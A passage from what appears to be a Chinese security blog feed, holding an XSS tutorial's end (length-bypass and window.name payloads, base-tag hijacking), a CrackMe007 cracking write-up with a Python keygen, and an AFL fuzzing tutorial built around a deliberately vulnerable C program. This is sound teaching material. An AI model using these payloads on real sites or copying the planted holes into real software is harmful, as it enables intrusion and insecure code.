class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(a + <span class="string">&#x27;XSS attack!&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="string">&quot; /&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，当第一个文本框获得焦点时，会执行 <code>onfocus</code> 事件中的JavaScript代码，定义了一个变量 <code>a</code>。由于第一个文本框的值以 <code>&quot;&gt;&lt;!--</code> 结尾，它实际上将中间的HTML内容注释掉了，直到遇到第二个文本框中的 <code>--&gt;</code>，这结束了注释。然后，第二个文本框中的 <code>&lt;script&gt;</code> 标签被正确解析并执行，弹出带有完整消息的警告框。</p><p>通过这种方式，我们成功地将较长的攻击代码分割成两个部分，并利用HTML注释符将它们连接起来，绕过了单个输入字段的长度限制。</p></li></ol><h1 id="使用base标签"><a href="#使用base标签" class="headerlink" title="使用base标签"></a>使用base标签</h1><p><code>&lt;base&gt;</code> 标签的作用是定义页面上的所有使用“相对路径”标签的hosting地址，可以作用于该标签之后的所有标签。</p><p>例如：</p><p>这样访问的img路径就是 <code>http://www.google.com/intl/en_ALL/images/srpr/logo1w.png</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.google.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/intl/en_ALL/images/srpr/logo1w.png&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者如果在页面中插入了 <code>&lt;base&gt;</code> 标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面中的所有使用“相对路径”的标签。</p><p>因此需要对这个标签进行过滤。</p><h1 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h1><p>对当前窗口的<code>window.name</code> 对象赋值，没有特殊字符的限制。</p><p>因为window对象是浏览器的窗体，而并非document对象，因此很多时候window对象不受同源策略的限制。黑客利用这个对象，可以实现跨域、跨页面传递数据。</p><p>使用window.name 可以缩短XSS Payload的长度，如下所示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.name = &quot;alert(document.cookie)&quot;;</span><br><span class="line">locaton.href = &quot;http://www.xssedsite.com/xssed.php&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在同一窗口打开存在XSS的站点后，只需通过XSS执行name中的代码即可：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(name);</span><br></pre></td></tr></table></figure><p>只有11个字节，短到了极点。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『逆向』CrackMe007 逆向分析</title>
      <link href="/posts/7dac.html"/>
      <url>/posts/7dac.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><ul><li><p><a href="https://github.com/TonyChen56/160-Crackme/tree/master/160%E4%B8%AACrackme007">crackme 007程序下载地址</a></p></li><li><p><a href="https://www.52pojie.cn/thread-1472768-1-1.html">Windows DarkDe4下载安装</a></p></li></ul><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240421234051364.png" alt="image-20240421234051364"></p><p>点击help，可以看到提示：破解目标是使所有的按钮消失，让程序下面的蓝色logo完整显现出来，不允许爆破。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422105549546.png" alt="image-20240422105549546"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>用Exeinfo PE工具查看该程序，得到信息如下图，可知该程序没有加壳，用Delphi语言编写。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422110526986.png" alt="image-20240422110526986"></p><p>并不需要脱壳处理</p><h2 id="DarkDe查看事件控件"><a href="#DarkDe查看事件控件" class="headerlink" title="DarkDe查看事件控件"></a>DarkDe查看事件控件</h2><p>因为是delphi的程序，先<strong>用Delphi的专用反编译工具DarkDe搜索涉及到的控件和事件函数信息</strong></p><p>事件信息：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422111325644.png" alt="image-20240422111325644"></p><p>控件信息：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422111332284.png" alt="image-20240422111332284"></p><p>可以看到程序有以下几个事件: </p><ul><li>Cancella按钮的点击事件 </li><li>About按钮的点击事件 </li><li>Registerz按钮的点击事件 </li><li>Again按钮的点击事件</li></ul><p>总共四个按钮事件。</p><p>在程序最开始并没有看到Again按钮，猜测为一个隐藏按钮。最开始只有一个Register按钮，因此我们<strong>后续就从Registerz按钮的点击事件开始分析</strong>。</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>将程序拖入ollydbg</p><p>分别在前面发现的事件对应的位置：00442B98，00442F28，004430BC上下断点</p><p>首先在Registerz按钮点击事件的位置 <code>00442F28</code> 下断点</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422113737449.png" alt="image-20240422113737449"></p><p>运行程序，随便输入name &#x3D; 123，Codice &#x3D; 123，F8向下单步执行。</p><p>可以看到这里有两个calll，调用了两个函数，去对应的地址看一下，第一个函数为获取codice，第二个函数检测codice是否为纯数字。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422155744890.png" alt="image-20240422155744890"></p><p>继续单步执行，走到下面的 <code>je</code> 跳转代码后，跳转到了 <code>00442F9D</code> 。</p><p>分析下面的 <code>je</code> 跳转代码，可以知道这里对codice进行了验证，如果codice是纯数字则跳转到 <code>00442F9D</code> 继续执行，如果不是纯数字则会弹窗 <code> &quot;You MUST insert a valid Long Integer Value in the Code Editor... Thank you :)&quot;</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422161158972.png" alt="image-20240422161158972"></p><p>所以正常情况下应该执行  <code>00442F9D</code> ，观察 <code>00442F9D</code> 后的代码，可以看到走到 <code>00442F9F  </code> 又会跳转到 <code>00442FFB</code> ，但是这个跳转处的注释为 “Please… The Code Must be &gt;0”，很明显这是一个异常提示的跳转，所以在这里未发生跳转为程序正常执行</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422161337070.png" alt="image-20240422161337070"></p><p>继续查看未发生跳转部分的汇编代码，可以看到 <code>00442FC0  </code> 处存在第三个跳转到 <code>00442FF2  </code> ，从 <code>00442FF2  </code> 处向下看经过了 <code>00442FFB</code> 处也就是错误提示的字符串，所以在 <code>00442FC0  </code> 处我们不让程序发生跳转，将 je 改为NOP</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422162604439.png" alt="image-20240422162604439"></p><p>F9继续运行程序，可以看到register按钮消失，出现了新的按钮again，直接点击again，可以看到停在了我们前面打的断点 <code>004430BC</code> 处。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422163242089.png" alt="image-20240422163242089"></p><p>向下翻看代码发现和前面的register按钮函数类似，我们执行同样的操作，将找到的位置 <code>00443159</code> 改为NOPs。</p><p>F9继续运行，可以看到已经成功实现了logo的还原，成功爆破。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422163618513.png" alt="image-20240422163618513"></p><h2 id="序号生成算法分析"><a href="#序号生成算法分析" class="headerlink" title="序号生成算法分析"></a>序号生成算法分析</h2><p>根据前面的爆破可以知道，register按钮和again按钮消失的逻辑分别出现在 <code>00442F9F</code> 和 <code>00443159</code> 之后。</p><p>所以首先对register按钮的 <code>00442F9F</code> 进行分析，分析后面的代码可以知道 <code>00442FB9</code> 为算法函数</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422164900113.png" alt="image-20240422164900113"></p><p>crtl + G 跟进到 <code>00442FB9</code> 查看算法函数，可以看到要求用户名要大于4个字符</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422165807004.png" alt="image-20240422165807004"></p><p>在算法后续的计算中涉及到了 eax ，回到前面可以发现在<code>00442FB9</code> 的前面有一个对 eax进行赋值的操作： <code>00442FB4</code>位置对eax进行了赋值，将地址445830的数值赋给了eax。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423143154927.png" alt="image-20240423143154927"></p><p>再检查在什么地方对地址445830进行了赋值，在地址442FB4处[右键]-[查找参考]-[地址常量]，可以查找到程序中所有涉及到这个地址常量的位置。</p><p>可以看到这个地址前面存在一个对445830进行赋值的操作，双击查看</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423145554207.png" alt="image-20240423145554207"></p><p>可以看到，当Codice输入的不全是数字时才对[0x445830] 赋值操作，而所赋的值为 <code>00442F81</code> 处调用函数 <code>00442A8C</code> 的返回值</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423145736385.png" alt="image-20240423145736385"></p><p>对00442A8C进行进一步分析，可以知道对应的[0x445830] 赋值方法</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423150158348.png" alt="image-20240423150158348"></p><p>发现存在逻辑：</p><p>当<strong>第一次输入的密码不为纯数字</strong>的时候，程序会根据密码生成一个值 <code>[0x445830]</code>，后续密码不为纯数字时需要根据这个值来进行运算，所以第一次输入的时候，密码一定要为纯字母，不然无法注册成功。</p><p>接下来进行了两层循环，计算的是用户名的第一位和最后一位的乘积，然后再乘以 <code>[0x445830]</code> 。外层循环变换用户名最后一位，每次往前移动一位。内层循环变换用户名第一位，每次往后移动一位。接着将结果保存到eax。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422170314520.png" alt="image-20240422170314520"></p><ul><li>将eax对 <code>0xA2C2A</code> 取模，记为结果1</li><li>将输入的密码除以 0x59 加上密码mod0x50，结果再加1，记为结果2</li><li>比较结果1和结果2是否相等。相等则返回1，消失按钮。不相等则返回0。</li></ul><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240422170812472.png" alt="image-20240422170812472"></p><p>again 按钮的函数算法类似</p><h1 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">szBuff = <span class="built_in">bytearray</span>(<span class="number">30</span>)</span><br><span class="line">CoBuff = <span class="built_in">bytearray</span>(<span class="number">30</span>)</span><br><span class="line">Regcode = <span class="number">0</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">Temp = <span class="number">0x37B</span></span><br><span class="line">Sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CrackeMe007注册机使用说明:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;输入纯字母的codice，关闭报错弹窗后填入计算出的正确codice&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入不少于6位的全字母codice:&quot;</span>)</span><br><span class="line">szBuff = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(szBuff) - <span class="number">1</span>):</span><br><span class="line">    Temp = Temp + ((szBuff[i + <span class="number">1</span>] % <span class="number">0x11</span> + <span class="number">1</span>) * szBuff[i])</span><br><span class="line"></span><br><span class="line">Temp = Temp % <span class="number">0x7148</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入用户名:不少于5位的纯数字&quot;</span>)</span><br><span class="line">CoBuff = <span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(CoBuff)):</span><br><span class="line">    Sum = Sum + CoBuff[i]</span><br><span class="line"></span><br><span class="line">Sum = (Sum * Sum * Temp) % <span class="number">0XA2C2A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0X50</span>):</span><br><span class="line">    Regcode = (Sum - i - <span class="number">1</span>) * <span class="number">0X59</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0X50</span>):</span><br><span class="line">        Temp = (Regcode + j) % <span class="number">0X50</span></span><br><span class="line">        <span class="keyword">if</span> Temp == i:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;用户名:%s对应的第%d个可用的注册码：%d&quot;</span> % (CoBuff.decode(<span class="string">&#x27;utf-8&#x27;</span>), a, Regcode + j))</span><br><span class="line">            a = a + <span class="number">1</span></span><br><span class="line">        Temp = <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;Press Enter to exit...&quot;</span>)</span><br><span class="line">sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随便构造纯数字的name和全字母的codice</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140221413.png" alt="image-20240423140221413"></p><p>产生报错，用上面的注册机生成密码</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140316807.png" alt="image-20240423140316807"></p><p>输入生成的第一个codice，可以看到register按钮消失</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140341510.png" alt="image-20240423140341510"></p><p>再输入前面固定的字符串，点击again按钮</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140629271.png" alt="image-20240423140629271"></p><p>再输入前面注册机得到的codice，成功显现所有的Logo，完成破解</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240423140701596.png" alt="image-20240423140701596"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://www.cnblogs.com/lonenysky/p/11345362.html">逆向破解之160个CrackMe —— 007</a></li><li><a href="https://blog.csdn.net/M_N_N/article/details/78206825">160个练手CrackMe-007</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『模糊测试』使用AFL进行模糊测试</title>
      <link href="/posts/a48c.html"/>
      <url>/posts/a48c.html</url>
      
        <content type="html"><![CDATA[<h1 id="模糊测试简介"><a href="#模糊测试简介" class="headerlink" title="模糊测试简介"></a>模糊测试简介</h1><p><strong>模糊测试（Fuzzing）</strong>，是一种挖掘软件安全漏洞、检测软件健壮性的黑盒测试方法，是目前软件测试、漏洞挖掘领域的最有效的手段之一，特别适合用于发现0Day漏洞。</p><p>其<strong>主要原理</strong>在于：</p><ul><li>通过随机或是半随机的方式生成大量数据，</li><li>将生成的数据输入给被测试的系统</li><li>检测被测系统的状态，如是否能够响应、响应是否正确等</li><li>根据被测系统的状态判断是否存在潜在的安全漏洞。</li></ul><p>目前比较成功的Fuzzer（执行模糊测试的程序）有AFL、libFuzzer、OSS-Fuzz等。</p><h1 id="AFL简介"><a href="#AFL简介" class="headerlink" title="AFL简介"></a>AFL简介</h1><p>AFL（American Fuzzy Lop）是由安全研究员Michal Zalewski开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240321161056683.png" alt="image-20240321161056683"></p><p>调试人员为程序提供一些输入，即最左侧的testcases，AFL加载后将其放入一个队列中。对于每一次迭代，AFL首先从队列中取出一个testcase，然后对它进行修剪，去除不必要的数据以提高运行效率；再然后对输入进行变异操作，变异的模式很多，可以产生很多新的testcase。对于这些新产生的输入，将它们送到目标程序运行，若能够产生新的执行路径或者导致程序崩溃，就把它再放到队列中。在整个过程中，程序崩溃会被记录下来，它可能代表一个潜藏的漏洞。</p><h2 id="AFL和LibFuzzer的区别"><a href="#AFL和LibFuzzer的区别" class="headerlink" title="AFL和LibFuzzer的区别"></a>AFL和LibFuzzer的区别</h2><p>LibFuzzer和AFL是目前最基本的两个模糊测试工具，而大部分的Fuzzer都是基于AFL和Libfuzzer进行进一步改进实现的，只要将这两个模糊测试工具弄明白，其它工具的安装和部署都是大同小异。</p><p>AFL和LibFuzzer的区别</p><ol><li><strong>集成方式：</strong><ul><li><strong>LibFuzzer：</strong> 通常与源代码直接集成，作为代码的一部分进行编译。它需要目标函数（即被测试的函数）的接口符合特定的格式（接受字节数组和长度作为参数）。</li><li><strong>AFL：</strong> 可以作为一个独立的工具运行，不需要对源代码进行修改。它通过插桩技术来监控程序的执行，以此来引导测试用例的生成。</li></ul></li><li><strong>测试用例生成：</strong><ul><li><strong>LibFuzzer：</strong> 使用基于覆盖率的指导来动态生成测试用例，旨在最大化代码覆盖率。</li><li><strong>AFL：</strong> 同样使用基于覆盖率的方法，但还结合了遗传算法来进化测试用例。</li></ul></li><li><strong>使用场景：</strong><ul><li><strong>LibFuzzer：</strong> 由于需要与源代码直接集成，因此更适合于对特定函数或模块进行深入的单元测试。</li><li><strong>AFL：</strong> 由于可以作为独立工具运行，因此更适合于对整个应用程序进行模糊测试，包括二进制文件。</li></ul></li></ol><p>根据不同的场景，我们可以从AFL和LibFuzzer中做出选择</p><h1 id="AFL的安装"><a href="#AFL的安装" class="headerlink" title="AFL的安装"></a>AFL的安装</h1><p>从 <a src="https://github.com/google/AFL">github项目主页</a> 下载压缩包，解压后进入所在目录。</p><p>执行以下命令进行编译和安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>输入 <code>afl-fuzz</code> 测试是否编译成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240321170854676.png" alt="image-20240321170854676"></p><h1 id="使用AFL进行模糊测试实战"><a href="#使用AFL进行模糊测试实战" class="headerlink" title="使用AFL进行模糊测试实战"></a>使用AFL进行模糊测试实战</h1><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><ol><li><p><strong>确定项目用什么语言编写</strong></p><p>AFL主要用于C&#x2F;C++程序的测试，所以我们先要确定项目是否为C&#x2F;C++编写。（也有一些基于AFL的JAVA Fuzz程序如<a href="https://github.com/isstac/kelinci">kelinci</a>、<a href="https://github.com/Barro/java-afl">java-afl</a>等，但并不知道效果如何）</p><p>如果要批量使用AFL进行模糊测试，如何判断项目的语言：</p><ul><li>项目提供了源代码：使用 <a src="https://github.com/github-linguist/linguist">github-linguist库</a> 进行判断</li><li>项目仅提供二进制文件：</li></ul></li><li><p><strong>是否有示例程序、测试用例</strong></p><ul><li><p>如果目标有现成的示例程序，特别是一些开源的库，可以方便我们直接用示例程序调用该库，不用自己再写一个程序</p></li><li><p>如果目标已经提供测试用例，那后面构建语料库时也省事儿一点</p></li></ul></li><li><p><strong>项目规模</strong></p><p>某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它 <code>treemap</code> 功能，可以直观地看到项目结构和规模。比如下面ImageMagick的源码中，灰框代表一个文件夹，蓝色方块代表了一个文件，其大小和颜色分别反映了行数和文件复杂度。</p></li></ol><h2 id="构建语料库"><a href="#构建语料库" class="headerlink" title="构建语料库"></a>构建语料库</h2><p>AFL需要一些初始输入数据（即种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。</p><h2 id="标准模式——有源码fuzz"><a href="#标准模式——有源码fuzz" class="headerlink" title="标准模式——有源码fuzz"></a>标准模式——有源码fuzz</h2><h3 id="编译插桩"><a href="#编译插桩" class="headerlink" title="编译插桩"></a>编译插桩</h3><p>首先我们可以自行用编写一个有漏洞的C语言程序 afl_test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">AFLTest</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为16，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    AFLTest(buf);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对该源文件进行编译插桩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc afl_test.c -o afl_test</span><br></pre></td></tr></table></figure><blockquote><p>如果编译一个c++的源码，使用afl-g++。</p></blockquote><p>现实情况下，我们往往需要对一整个项目而不是单个的C&#x2F;C++文件进行fuzz，所以需要指定afl-gcc&#x2F;afl-g++对整个项目进行编译插桩</p><blockquote><p>命令的具体含义与作用可以参考文章xx的 <code>linux下软件的发布与安装</code> 部分内容</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=<span class="string">&quot;afl-gcc&quot;</span> CXX=<span class="string">&quot;afl-g++&quot;</span> --disable-shared <span class="comment"># 指定C和C++的编译器为afl所提供的编译插桩工具</span></span><br><span class="line">make <span class="comment"># 然后再进行编译</span></span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>编译后的结果如下图，可以看到对我们留下的漏洞产生了warning，不用理会</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240322154357305.png" alt="image-20240322154357305"></p><h3 id="建立输入和输出文件夹"><a href="#建立输入和输出文件夹" class="headerlink" title="建立输入和输出文件夹"></a>建立输入和输出文件夹</h3><p>一般的程序接收的输入为标准输入流stdin类型或者文件类型</p><blockquote><p>stdin指的是从标准输入流（stdin，标准输入设备）中获取输入数据。</p><p>stdin通常用于从终端（命令行）或其他程序中读取输入。这种方式可以让程序<strong>接受用户的交互式输入或从其他程序输出中获取数据</strong>，而<strong>无需直接依赖于文件或其他输入源</strong>。</p></blockquote><p>对于我们这个文件afl_test.c，可以知道接收的输入类型为stdin标准输入流</p><p>建立两个文件夹：fuzz_in和fuzz_out，用来存放程序的输入和fuzz的输出结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> fuzz_in</span><br><span class="line"><span class="built_in">mkdir</span> fuzz_out</span><br></pre></td></tr></table></figure><p>在fuzz_in文件夹下构建初始测试用例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fuzz_in</span><br><span class="line">vim testcase</span><br></pre></td></tr></table></figure><p>在testcae文件中写入程序的输入数据，这里也可以随意输入一点文本，作为起始种子。（因为afl会根据初始种子自动变异生成更多的测试样例，所以初始种子可以随意一点）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;asdsas&quot;</span> &gt;&gt; testcase</span><br></pre></td></tr></table></figure><blockquote><p><code>afl-fuzz</code>会将<code>testcase</code>文件中的内容作为输入，通过标准输入流（stdin）传递给目标程序。</p><p>所以这里是基于stdin而并不是文件</p></blockquote><h3 id="使用-afl-fuzz-工具执行fuzz测试"><a href="#使用-afl-fuzz-工具执行fuzz测试" class="headerlink" title="使用 afl-fuzz 工具执行fuzz测试"></a>使用 afl-fuzz 工具执行fuzz测试</h3><p>针对程序不同的输入类型：</p><ul><li><p>从stdin读取输入的目标程序，fuzz命令语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program 